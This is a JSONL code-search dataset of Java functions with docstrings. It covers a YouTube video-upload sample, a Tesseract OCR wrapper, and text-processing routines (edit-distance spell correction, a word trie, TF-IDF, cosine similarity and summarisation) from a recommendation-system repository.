project\n            // and use your own standard names instead.\n            Calendar cal = Calendar.getInstance();\n            snippet.setTitle(\"Test Upload via Java on \" + cal.getTime());\n            snippet.setDescription(\n                    \"Video uploaded via YouTube Data API V3 using the Java library \" + \"on \" + cal.getTime());\n\n            // Set the keyword tags that you want to associate with the video.\n            List<String> tags = new ArrayList<String>();\n            tags.add(\"test\");\n            tags.add(\"example\");\n            tags.add(\"java\");\n            tags.add(\"YouTube Data API V3\");\n            tags.add(\"erase me\");\n            snippet.setTags(tags);\n\n            // Add the completed snippet object to the video resource.\n            videoObjectDefiningMetadata.setSnippet(snippet);\n\n            InputStreamContent mediaContent = new InputStreamContent(VIDEO_FILE_FORMAT,\n                    UploadVideo.class.getResourceAsStream(\"/sample-video.mp4\"));\n\n            // Insert the video. The command sends three arguments. The first\n            // specifies which information the API request is setting and which\n            // information the API response should return. The second argument\n            // is the video resource that contains metadata about the new video.\n            // The third argument is the actual video content.\n            YouTube.Videos.Insert videoInsert = youtube.videos()\n                    .insert(\"snippet,statistics,status\", videoObjectDefiningMetadata, mediaContent);\n\n            // Set the upload type and add an event listener.\n            MediaHttpUploader uploader = videoInsert.getMediaHttpUploader();\n\n            // Indicate whether direct media upload is enabled. A value of\n            // \"True\" indicates that direct media upload is enabled and that\n            // the entire media content will be uploaded in a single request.\n            // A value of \"False,\" which is the default, indicates that the\n            // request will use the resumable media upload protocol, which\n            // supports the ability to resume an upload operation after a\n            // network interruption or other transmission failure, saving\n            // time and bandwidth in the event of network failures.\n            uploader.setDirectUploadEnabled(false);\n\n            MediaHttpUploaderProgressListener progressListener = new MediaHttpUploaderProgressListener() {\n                public void progressChanged(MediaHttpUploader uploader) throws IOException {\n                    switch (uploader.getUploadState()) {\n                        case INITIATION_STARTED:\n                            System.out.println(\"Initiation Started\");\n                            break;\n                        case INITIATION_COMPLETE:\n                            System.out.println(\"Initiation Completed\");\n                            break;\n                        case MEDIA_IN_PROGRESS:\n                            System.out.println(\"Upload in progress\");\n                            System.out.println(\"Upload percentage: \" + uploader.getProgress());\n                            break;\n                        case MEDIA_COMPLETE:\n                            System.out.println(\"Upload Completed!\");\n                            break;\n                        case NOT_STARTED:\n                            System.out.println(\"Upload Not Started!\");\n                            break;\n                    }\n                }\n            };\n            uploader.setProgressListener(progressListener);\n\n            // Call the API and upload the video.\n            Video returnedVideo = videoInsert.execute();\n\n            // Print data about the newly inserted video from the API response.\n            System.out.println(\"\\n================== Returned Video ==================\\n\");\n            System.out.println(\"  - Id: \" + returnedVideo.getId());\n            System.out.println(\"  - Title: \" + returnedVideo.getSnippet().getTitle());\n            System.out.println(\"  - Tags: \" + returnedVideo.getSnippet().getTags());\n            System.out.println(\"  - Privacy Status: \" + returnedVideo.getStatus().getPrivacyStatus());\n            System.out.println(\"  - Video Count: \" + returnedVideo.getStatistics().getViewCount());\n\n        } catch (GoogleJsonResponseException e) {\n            System.err.println(\"GoogleJsonResponseException code: \" + e.getDetails().getCode() + \" : \"\n                    + e.getDetails().getMessage());\n            e.printStackTrace();\n        } catch (IOException e) {\n            System.err.println(\"IOException: \" + e.getMessage());\n            e.printStackTrace();\n        } catch (Throwable t) {\n            System.err.println(\"Throwable: \" + t.getMessage());\n            t.printStackTrace();\n        }\n    }", "path": "video\\src\\main\\java\\com\\google\\api\\services\\samples\\youtube\\cmdline\\data\\UploadVideo.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Performs OCR operation. Use\n * <code>SetImage</code>, (optionally)\n * <code>SetRectangle</code>, and one or more of the\n * <code>Get*Text</code> functions.\n *\n * @param xsize width of image\n * @param ysize height of image\n * @param buf pixel data\n * @param rect the bounding rectangle defines the region of the image to be\n * recognized. A rectangle of zero dimension or\n * <code>null</code> indicates the whole image.\n * @param bpp bits per pixel, represents the bit depth of the image, with 1\n * for binary bitmap, 8 for gray, and 24 for color RGB.\n * @return the recognized text\n * @throws TesseractException\n */\n", "func_signal": "public String doOCR(int xsize, int ysize, ByteBuffer buf, Rectangle rect, int bpp) throws TesseractException", "code": "{\n    init();\n    setTessVariables();\n\n    try {\n        setImage(xsize, ysize, buf, rect, bpp);\n        return getOCRText();\n    } catch (Exception e) {\n        logger.log(Level.SEVERE, e.getMessage(), e);\n        throw new TesseractException(e);\n    } finally {\n        dispose();\n    }\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\tess4j\\Tesseract.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * \n* @Title: editDistance2\n* @Description: \u7f16\u8f91\u8ddd\u79bb\u4e3a2\u7684\u96c6\u5408.\u901a\u8fc7editDistance1\u51fd\u6570\u5f97\u5230\u7f16\u8f91\u8ddd\u79bb\u4e3a1\u7684\u96c6\u5408,\u8be5\u96c6\u5408\u5355\u8bcd\u518d\u901a\u8fc7editDistance1\u51fd\u6570,\u5c31\u53ef\u4ee5\u5f97\u5230\u7f16\u8f91\u8ddd\u79bb\u4e3a2\u7684\u96c6\u5408\n* @param @param set\n* @param @param trainMap\n* @param @return    \n* @return Set<String>   \n* @throws\n */\n", "func_signal": "public static Set<String> editDistance2(Set<String> set,HashMap<String,Integer> trainMap)", "code": "{\n\tSet<String> editDistance2Set=new HashSet<String>();\n\tSet<String> tempSet=new HashSet<String>();\n\tSet<String> tmpSet=new HashSet<String>();\n\tfor(String s: set){\n\t\ttempSet.addAll(editDistance1(s));\n\t}\n\tfor(String s: tempSet){\n\t\teditDistance2Set.addAll(editDistance1(s));\n\t}\n\tfor(String s : editDistance2Set){\n\t\tif(!trainMap.containsKey(s)){\n\t\t\ttmpSet.add(s);\n\t\t}\n\t}\n\treturn tmpSet;\n}", "path": "src\\com\\xq\\algorithm\\SpellCorrect.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: searchWord\n* @Description: \u641c\u7d22\u5355\u8bcd,\u4ee5a-z\u4e3a\u6839,\u5206\u522b\u5411\u4e0b\u9012\u5f52\u641c\u7d22\n* @param @param word\n* @param @return    \n* @return List<String>   \n* @throws\n */\n", "func_signal": "public List<String> searchWord(String word)", "code": "{\n\tif(word==null || \"\".equals(word.trim())){\n\t\treturn new ArrayList<String>();\n\t}\n\tif(!word.matches(englishPattern)){\n\t\treturn new ArrayList<String>();\n\t}\n\tchar c = word.charAt(0);\n\tc = Character.toLowerCase(c);\n\tint index = c - 'a';\n\tList<String> list=new ArrayList<String>();\n\tif(root.next==null){\n\t\treturn list;\n\t}\n\tfor(int i=0;i<ARRAY_LENGTH;i++){\n\t\tint j='a'+i;\n\t\tchar temp=(char)j;\n\t\tif(root.next[i]!=null){\n\t\t\tif(index==i){\n\t\t\t\tfullSearch(root.next[i],list,word.substring(1),\"\"+temp,word);\n\t\t\t}else{\n\t\t\t\tfullSearch(root.next[i],list,word,\"\"+temp,word);\n\t\t\t}\n\t\t}\n\t}\n\treturn list;\n}", "path": "src\\com\\xq\\algorithm\\WordTrie.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: allTf\n* @Description: \u5f97\u5230\u6240\u6709\u6587\u4ef6\u7684tf\n* @param @param dir\n* @param @return Map<String, Map<String, Double>>\n* @return Map<String,Map<String,Double>>   \n* @throws\n */\n", "func_signal": "public static Map<String, Map<String, Double>> allTf(String dir)", "code": "{\n\ttry{\n\t\tfileList=readDirs(dir);\n\t\tfor(String filePath : fileList){\n\t\t\tString content=readFile(filePath);\n\t\t\tMap<String, Integer> segs=segString(content);\n  \t\t\t    allSegsMap.put(filePath, segs);\n\t\t\tallTfMap.put(filePath, tf(segs));\n\t\t}\n\t}catch(FileNotFoundException ffe){\n\t\tffe.printStackTrace();\n\t}catch(IOException io){\n\t\tio.printStackTrace();\n\t}\n\treturn allTfMap;\n}", "path": "src\\com\\xq\\algorithm\\TfIdfAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: tf\n* @Description: \u5206\u8bcd\u7ed3\u679c\u8f6c\u5316\u4e3atf,\u516c\u5f0f\u4e3a:tf(w,d) = count(w, d) / size(d)\n* \u5373\u8bcdw\u5728\u6587\u6863d\u4e2d\u51fa\u73b0\u6b21\u6570count(w, d)\u548c\u6587\u6863d\u4e2d\u603b\u8bcd\u6570size(d)\u7684\u6bd4\u503c\n* @param @param segWordsResult\n* @param @return    \n* @return HashMap<String,Double>   \n* @throws\n */\n", "func_signal": "private static HashMap<String, Double> tf(Map<String, Integer> segWordsResult)", "code": "{ \n\t\n    HashMap<String, Double> tf = new HashMap<String, Double>();// \u6b63\u89c4\u5316  \n    if(segWordsResult==null || segWordsResult.size()==0){\n\t\treturn tf;\n\t}\n    Double size=Double.valueOf(segWordsResult.size());\n    Set<String> keys=segWordsResult.keySet();\n    for(String key: keys){\n    \tInteger value=segWordsResult.get(key);\n    \ttf.put(key, Double.valueOf(value)/size);\n    }\n    return tf;  \n}", "path": "src\\com\\xq\\algorithm\\TfIdfAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: calculateCos\n* @Description: \u8ba1\u7b97\u4f59\u5f26\u76f8\u4f3c\u6027\n* @param @param first\n* @param @param second\n* @param @return    \n* @return Double   \n* @throws\n */\n", "func_signal": "private static Double calculateCos(LinkedHashMap<String, Integer> first,LinkedHashMap<String, Integer> second)", "code": "{\n\t\n\tList<Map.Entry<String, Integer>> firstList = new ArrayList<Map.Entry<String, Integer>>(first.entrySet());\n\tList<Map.Entry<String, Integer>> secondList = new ArrayList<Map.Entry<String, Integer>>(second.entrySet());\n\t//\u8ba1\u7b97\u76f8\u4f3c\u5ea6  \n        double vectorFirstModulo = 0.00;//\u5411\u91cf1\u7684\u6a21  \n        double vectorSecondModulo = 0.00;//\u5411\u91cf2\u7684\u6a21  \n        double vectorProduct = 0.00; //\u5411\u91cf\u79ef  \n        int secondSize=second.size();\n\tfor(int i=0;i<firstList.size();i++){\n\t\tif(i<secondSize){\n\t\t\tvectorSecondModulo+=secondList.get(i).getValue().doubleValue()*secondList.get(i).getValue().doubleValue();\n\t\t\tvectorProduct+=firstList.get(i).getValue().doubleValue()*secondList.get(i).getValue().doubleValue();\n\t\t}\n\t\tvectorFirstModulo+=firstList.get(i).getValue().doubleValue()*firstList.get(i).getValue().doubleValue();\n\t}\n   return vectorProduct/(Math.sqrt(vectorFirstModulo)*Math.sqrt(vectorSecondModulo));\n}", "path": "src\\com\\xq\\algorithm\\CosineSimilarAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: depthSearch\n* @Description: \u6df1\u5ea6\u904d\u5386\u5b50\u6811\n* @param @param node\n* @param @param list \u4fdd\u5b58\u641c\u7d22\u5230\u7684\u5b57\u7b26\u4e32\n* @param @param word \u641c\u7d22\u7684\u5355\u8bcd.\u5339\u914d\u5230\u7b2c\u4e00\u4e2a\u5219\u51cf\u53bb\u4e00\u4e2a\u7b2c\u4e00\u4e2a,\u8fde\u7eed\u5339\u914d,\u76f4\u5230word\u4e3a\u7a7a\u4e32.\u82e5\u6ca1\u6709\u8fde\u7eed\u5339\u914d,\u5219\u6062\u590d\u5230\u539f\u4e32\u3002\n* @param @param matchedWord \u5339\u914d\u5230\u7684\u5355\u8bcd\n* @param @return    \n* @return List<String>   \n* @throws\n */\n", "func_signal": "private List<String> depthSearch(TrieNode node,List<String> list,String word,String matchedWord,String inputWord)", "code": "{\n\tif(node.nodeState==1 && word.length()==0){\n\t\tlist.add(matchedWord);\n\t}\n\tif(word.length() != 0){\n\t\tchar c = word.charAt(0);\n\t\tc = Character.toLowerCase(c);\n\t\tint index = c - 'a';\n\t\t//\u7ee7\u7eed\u5b8c\u5168\u5339\u914d,\u76f4\u5230word\u4e3a\u7a7a\u4e32,\u5426\u5219\u672a\u627e\u5230\n\t\tif(node.next[index]!=null){\n\t\t\tdepthSearch(node.next[index], list, word.substring(1), matchedWord+c,inputWord);\n\t\t}\n\t}else{\n\t\tif(node.prefixCount>0){//\u82e5\u5339\u914d\u5355\u8bcd\u7ed3\u675f,\u4f46\u662ftrie\u4e2d\u7684\u5355\u8bcd\u5e76\u6ca1\u6709\u5b8c\u5168\u627e\u5230,\u9700\u7ee7\u7eed\u627e\u5230trie\u4e2d\u7684\u5355\u8bcd\u7ed3\u675f.\n\t\t\t//node.prefixCount>0\u8868\u793atrie\u4e2d\u7684\u5355\u8bcd\u8fd8\u672a\u7ed3\u675f\n\t\t\tfor(int i=0;i<ARRAY_LENGTH;i++){\n\t\t\t\tif(node.next[i]!=null){\n\t\t\t\t\tint j='a'+i;\n\t\t\t\t\tchar temp=(char)j;\n\t\t\t\t\tdepthSearch(node.next[i], list, zeroString, matchedWord+temp,inputWord);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn list;\n}", "path": "src\\com\\xq\\algorithm\\WordTrie.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: segStr\n* @Description: \u8fd4\u56deLinkedHashMap\u7684\u5206\u8bcd\n* @param @param content\n* @param @return    \n* @return Map<String,Integer>   \n* @throws\n */\n", "func_signal": "public static Map<String, Integer> segStr(String content)", "code": "{\n    // \u5206\u8bcd\n    Reader input = new StringReader(content);\n    // \u667a\u80fd\u5206\u8bcd\u5173\u95ed\uff08\u5bf9\u5206\u8bcd\u7684\u7cbe\u5ea6\u5f71\u54cd\u5f88\u5927\uff09\n    IKSegmenter iks = new IKSegmenter(input, true);\n    Lexeme lexeme = null;\n    Map<String, Integer> words = new LinkedHashMap<String, Integer>();\n    try {\n        while ((lexeme = iks.next()) != null) {\n            if (words.containsKey(lexeme.getLexemeText())) {\n                words.put(lexeme.getLexemeText(), words.get(lexeme.getLexemeText()) + 1);\n            } else {\n                words.put(lexeme.getLexemeText(), 1);\n            }\n        }\n    }catch(IOException e) {\n        e.printStackTrace();\n    }\n    return words;\n}", "path": "src\\com\\xq\\algorithm\\SimpleSummariserAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: editDistance1\n* @Description: \u7f16\u8f91\u8ddd\u79bb\u4e3a1\u7684\u51fd\u6570\n* @param @param word\n* @param @return    \n* @return Set<String>   \n* @throws\n */\n", "func_signal": "public static Set<String> editDistance1(String word)", "code": "{\n\tString tempWord = \"\";\n\tSet<String> set = new HashSet<String>();\n\tint n = word.length();\n\t// delete\u4e00\u4e2a\u5b57\u6bcd\u7684\u60c5\u51b5\n\tfor (int i = 0; i < n; i++){\n\t\ttempWord = word.substring(0, i) + word.substring(i + 1);\n\t\tset.add(tempWord);\n\t}\n\t//transposition\n\tfor (int i = 0; i < n - 1; i++) {\n\t\t/*tempWord = word.substring(0, i) + word.substring(i + 1, i + 2)\n\t\t\t\t+ word.substring(i, i + 1) + word.substring(i + 2, n);*/\n\t\ttempWord = word.substring(0, i) + word.charAt(i+1)+word.charAt(i)+word.substring(i + 2, n);\n\n\t\tset.add(tempWord);\n\t}\n\n\t// alteration 26n\n\tfor (int i = 0; i < n; i++) {\n\t\tfor (int j = 0; j < 26; j++) {\n\t\t\ttempWord = word.substring(0, i) + c[j] + word.substring(i + 1, n);\n\t\t\tset.add(tempWord);\n\t\t}\n\t}\n\n\t// insertion 26n\n\tfor (int i = 0; i < n+1; i++) {\n\t\tfor (int j = 0; j < 26; j++) {\n\t\t\ttempWord = word.substring(0, i) + c[j] + word.substring(i, n);\n\t\t\tset.add(tempWord);\n\t\t}\n\t}\n\t// \u5c06\u5b57\u6bcd\u63d2\u5165\u5230\u6700\u540e n\n\tfor (int j = 0; j < 26; j++) {\n\t\tset.add(word + c[j]);\n\t}\n\treturn set;\n}", "path": "src\\com\\xq\\algorithm\\SpellCorrect.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: prefixSearchWord\n* @Description: \u524d\u7f00\u641c\u7d22\n* @param @param word\n* @param @return    \n* @return List<String>   \n* @throws\n */\n", "func_signal": "public List<String> prefixSearchWord(String word)", "code": "{\n\tif(word==null || \"\".equals(word.trim())){\n\t\treturn new ArrayList<String>();\n\t}\n\tif(!word.matches(englishPattern)){\n\t\treturn new ArrayList<String>();\n\t}\n\tchar c = word.charAt(0);\n\tc = Character.toLowerCase(c);\n\tint index = c - 'a';\n\tif(root.next!=null && root.next[index]!=null){\n\t\treturn depthSearch(root.next[index],new ArrayList<String>(),word.substring(1),\"\"+c,word);\n\t}else{\n\t\treturn new ArrayList<String>();\n\t}\n}", "path": "src\\com\\xq\\algorithm\\WordTrie.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: addWord\n* @Description: add word\n* @param @param word    \n* @return void   \n* @throws\n */\n", "func_signal": "public void addWord(String word)", "code": "{\n\tif(word==null || \"\".equals(word.trim())){\n\t\tthrow new IllegalArgumentException(\"word can not be null!\");\n\t}\n\tif(!word.matches(englishPattern)){\n\t\tthrow new IllegalArgumentException(\"word must be english!\");\n\t}\n\taddWord(root, word);\n}", "path": "src\\com\\xq\\algorithm\\WordTrie.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: cosSimilarityByString\n* @Description: \u5f97\u5230\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u76f8\u4f3c\u6027\n* @param @param first\n* @param @param second\n* @param @return    \n* @return Double   \n* @throws\n */\n", "func_signal": "public static Double cosSimilarityByString(String first,String second)", "code": "{\n\ttry{\n\t\tMap<String, Integer> firstTfMap=TfIdfAlgorithm.segStr(first);\n\t\tMap<String, Integer> secondTfMap=TfIdfAlgorithm.segStr(second);\n\t\tif(firstTfMap.size()<secondTfMap.size()){\n\t\t\tMap<String, Integer> temp=firstTfMap;\n\t\t\tfirstTfMap=secondTfMap;\n\t\t\tsecondTfMap=temp;\n\t\t}\n\t\treturn calculateCos((LinkedHashMap<String, Integer>)firstTfMap, (LinkedHashMap<String, Integer>)secondTfMap);\n\t\t\n\t}catch(Exception e){\n\t\te.printStackTrace();\n\t}\n\treturn 0d;\n}", "path": "src\\com\\xq\\algorithm\\CosineSimilarAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: summarise\n* @Description: \u6587\u7ae0\u6458\u8981\u5b9e\u73b0\n* @param @param input\n* @param @param numSentences\n* @param @return    \n* @return String   \n* @throws\n */\n", "func_signal": "public static String summarise(String input, int numSentences)", "code": "{\n    // get the frequency of each word in the input\n    Map<String,Integer> wordFrequencies = segStr(input);\n\n    // now create a set of the X most frequent words\n    Set<String> mostFrequentWords = getMostFrequentWords(100, wordFrequencies).keySet();\n\n    // break the input up into sentences\n    // workingSentences is used for the analysis, but\n    // actualSentences is used in the results so that the \n    // capitalisation will be correct.\n    String[] workingSentences = getSentences(input.toLowerCase());\n    String[] actualSentences = getSentences(input);\n\n    // iterate over the most frequent words, and add the first sentence \n    // that includes each word to the result\n    Set<String> outputSentences = new LinkedHashSet<String>();\n    Iterator<String> it = mostFrequentWords.iterator();\n    while (it.hasNext()) {\n        String word = (String) it.next();\n        for (int i = 0; i < workingSentences.length; i++) {\n            if (workingSentences[i].indexOf(word) >= 0) {\n                outputSentences.add(actualSentences[i]);\n                break;\n            }\n            if (outputSentences.size() >= numSentences) {\n                break;\n            }\n        }\n        if (outputSentences.size() >= numSentences) {\n            break;\n        }\n\n    }\n\n    List<String> reorderedOutputSentences = reorderSentences(outputSentences, input);\n\n    StringBuffer result = new StringBuffer(\"\");\n    it = reorderedOutputSentences.iterator();\n    while (it.hasNext()) {\n        String sentence = (String) it.next();\n        result.append(sentence);\n        result.append(\".\"); // This isn't always correct - perhaps it should be whatever symbol the sentence finished with\n        if (it.hasNext()) {\n            result.append(\" \");\n        }\n    }\n\n    return result.toString();\n}", "path": "src\\com\\xq\\algorithm\\SimpleSummariserAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: cosSimilarityByFile\n* @Description: \u83b7\u53d6\u4e24\u4e2a\u6587\u4ef6\u76f8\u4f3c\u6027\n* @param @param firstFile\n* @param @param secondFile\n* @param @return    \n* @return Double   \n* @throws\n */\n", "func_signal": "public static Double cosSimilarityByFile(String firstFile,String secondFile)", "code": "{\n\ttry{\n\t\tMap<String, Map<String, Integer>> firstTfMap=TfIdfAlgorithm.wordSegCount(firstFile);\n\t\tMap<String, Map<String, Integer>> secondTfMap=TfIdfAlgorithm.wordSegCount(secondFile);\n\t\tif(firstTfMap==null || firstTfMap.size()==0){\n\t\t\tthrow new IllegalArgumentException(\"firstFile not found or firstFile is empty! \");\n\t\t}\n\t\tif(secondTfMap==null || secondTfMap.size()==0){\n\t\t\tthrow new IllegalArgumentException(\"secondFile not found or secondFile is empty! \");\n\t\t}\n\t\tMap<String,Integer> firstWords=firstTfMap.get(firstFile);\n\t\tMap<String,Integer> secondWords=secondTfMap.get(secondFile);\n\t\tif(firstWords.size()<secondWords.size()){\n\t\t\tMap<String, Integer> temp=firstWords;\n\t\t\tfirstWords=secondWords;\n\t\t\tsecondWords=temp;\n\t\t}\n\t\treturn calculateCos((LinkedHashMap<String, Integer>)firstWords, (LinkedHashMap<String, Integer>)secondWords);\n\t\t\n\t}catch(Exception e){\n\t\te.printStackTrace();\n\t}\n\treturn 0d;\n}", "path": "src\\com\\xq\\algorithm\\CosineSimilarAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: fullSearch\n* @Description: \u5339\u914d\u5230\u5bf9\u5e94\u7684\u5b57\u6bcd,\u5219\u4ee5\u8be5\u5b57\u6bcd\u4e3a\u5b57\u6839,\u7ee7\u7eed\u5339\u914d\u5b8c\u6240\u6709\u7684\u5355\u8bcd\u3002\n* @param @param node\n* @param @param list \u4fdd\u5b58\u641c\u7d22\u5230\u7684\u5b57\u7b26\u4e32\n* @param @param word \u641c\u7d22\u7684\u5355\u8bcd.\u5339\u914d\u5230\u7b2c\u4e00\u4e2a\u5219\u51cf\u53bb\u4e00\u4e2a\u7b2c\u4e00\u4e2a,\u8fde\u7eed\u5339\u914d,\u76f4\u5230word\u4e3a\u7a7a\u4e32.\u82e5\u6ca1\u6709\u8fde\u7eed\u5339\u914d,\u5219\u6062\u590d\u5230\u539f\u4e32\u3002\n* @param @param matchedWord \u5339\u914d\u5230\u7684\u5355\u8bcd\n* @param @return    \n* @return List<String>   \n* @throws\n */\n", "func_signal": "private List<String> fullSearch(TrieNode node,List<String> list,String word,String matchedWord,String inputWord)", "code": "{\n\tif(node.nodeState==1  && word.length()==0){\n\t\tlist.add(matchedWord);\n\t}\n\tif(word.length() != 0){\n\t\tchar c = word.charAt(0);\n\t\tc = Character.toLowerCase(c);\n\t\tint index = c - 'a';\n\t\tfor(int i=0;i<ARRAY_LENGTH;i++){\n\t\t\tif(node.next[i]!=null){\n\t\t\t\tint j='a'+i;\n\t\t\t\tchar temp=(char)j;\n\t\t\t\tif(index==i){\n\t\t\t\t\t//\u8fde\u7eed\u5339\u914d\n\t\t\t\t\tfullSearch(node.next[i], list, word.substring(1), matchedWord+temp,inputWord);\n\t\t\t\t}else{\n\t\t\t\t\t//\u672a\u8fde\u7eed\u5339\u914d,\u5219\u91cd\u65b0\u5339\u914d\n\t\t\t\t\tfullSearch(node.next[i], list, inputWord, matchedWord+temp,inputWord);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}else{\n\t\tif(node.prefixCount>0){\n\t\t\tfor(int i=0;i<ARRAY_LENGTH;i++){\n\t\t\t\tif(node.next[i]!=null){\n\t\t\t\t\tint j='a'+i;\n\t\t\t\t\tchar temp=(char)j;\n\t\t\t\t\tfullSearch(node.next[i], list, zeroString, matchedWord+temp,inputWord);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn list;\n}", "path": "src\\com\\xq\\algorithm\\WordTrie.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: readFile\n* @Description: \u8bfb\u53d6\u6587\u4ef6\u8f6c\u5316\u6210string\n* @param @param file\n* @param @return String\n* @param @throws FileNotFoundException\n* @param @throws IOException    \n* @return String   \n* @throws\n */\n", "func_signal": "private static String readFile(String file) throws FileNotFoundException, IOException", "code": "{  \n    StringBuffer sb = new StringBuffer();  \n    InputStreamReader is = new InputStreamReader(new FileInputStream(file), \"UTF-8\");  \n    BufferedReader br = new BufferedReader(is);  \n    String line = br.readLine();  \n    while (line != null) {  \n        sb.append(line).append(\"\\r\\n\");  \n        line = br.readLine();  \n    }  \n    br.close();  \n    return sb.toString();  \n}", "path": "src\\com\\xq\\algorithm\\TfIdfAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: segStr\n* @Description: \u8fd4\u56deLinkedHashMap\u7684\u5206\u8bcd\n* @param @param content\n* @param @return    \n* @return Map<String,Integer>   \n* @throws\n */\n", "func_signal": "public static Map<String, Integer> segStr(String content)", "code": "{\n    // \u5206\u8bcd\n    Reader input = new StringReader(content);\n    // \u667a\u80fd\u5206\u8bcd\u5173\u95ed\uff08\u5bf9\u5206\u8bcd\u7684\u7cbe\u5ea6\u5f71\u54cd\u5f88\u5927\uff09\n    IKSegmenter iks = new IKSegmenter(input, true);\n    Lexeme lexeme = null;\n    Map<String, Integer> words = new LinkedHashMap<String, Integer>();\n    try {\n        while ((lexeme = iks.next()) != null) {\n            if (words.containsKey(lexeme.getLexemeText())) {\n                words.put(lexeme.getLexemeText(), words.get(lexeme.getLexemeText()) + 1);\n            } else {\n                words.put(lexeme.getLexemeText(), 1);\n            }\n        }\n    }catch(IOException e) {\n        e.printStackTrace();\n    }\n    return words;\n}", "path": "src\\com\\xq\\algorithm\\TfIdfAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: addWord\n* @Description:add word to node\n* @param @param node\n* @param @param word    \n* @return void   \n* @throws\n */\n", "func_signal": "private void addWord(TrieNode node, String word)", "code": "{\n\tif (word.length() == 0) { // if all characters of the word has been\n\t\t// added\n\t\tnode.count++;\n\t\tnode.nodeState=1;\n\t} else {\n\t\tnode.prefixCount++;\n\t\tchar c = word.charAt(0);\n\t\tc = Character.toLowerCase(c);\n\t\tint index = c - 'a';\n\t\tif(index>=0 && index<ARRAY_LENGTH){\n\t\t\tif (node.next[index] == null) { \n\t\t\t\tnode.next[index] = new TrieNode();\n\t\t\t}\n\t\t\t// go the the next character\n\t\t\taddWord(node.next[index], word.substring(1));\n\t\t}\n\t\t \n\t}\n}", "path": "src\\com\\xq\\algorithm\\WordTrie.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
{"docstring": "/**\n * \n* @Title: segString\n* @Description: \u7528ik\u8fdb\u884c\u5b57\u7b26\u4e32\u5206\u8bcd,\u7edf\u8ba1\u5404\u4e2a\u8bcd\u51fa\u73b0\u7684\u6b21\u6570\n* @param @param content\n* @param @return  Map<String, Integer>  \n* @return Map<String,Integer>   \n* @throws\n */\n", "func_signal": "private static Map<String, Integer> segString(String content)", "code": "{\n    // \u5206\u8bcd\n    Reader input = new StringReader(content);\n    // \u667a\u80fd\u5206\u8bcd\u5173\u95ed\uff08\u5bf9\u5206\u8bcd\u7684\u7cbe\u5ea6\u5f71\u54cd\u5f88\u5927\uff09\n    IKSegmenter iks = new IKSegmenter(input, true);\n    Lexeme lexeme = null;\n    Map<String, Integer> words = new HashMap<String, Integer>();\n    try {\n        while ((lexeme = iks.next()) != null) {\n            if (words.containsKey(lexeme.getLexemeText())) {\n                words.put(lexeme.getLexemeText(), words.get(lexeme.getLexemeText()) + 1);\n            } else {\n                words.put(lexeme.getLexemeText(), 1);\n            }\n        }\n    }catch(IOException e) {\n        e.printStackTrace();\n    }\n    return words;\n}", "path": "src\\com\\xq\\algorithm\\TfIdfAlgorithm.java", "repo_name": "awnuxkjy/recommend-system", "stars": 68, "license": "None", "language": "java", "size": 3591}
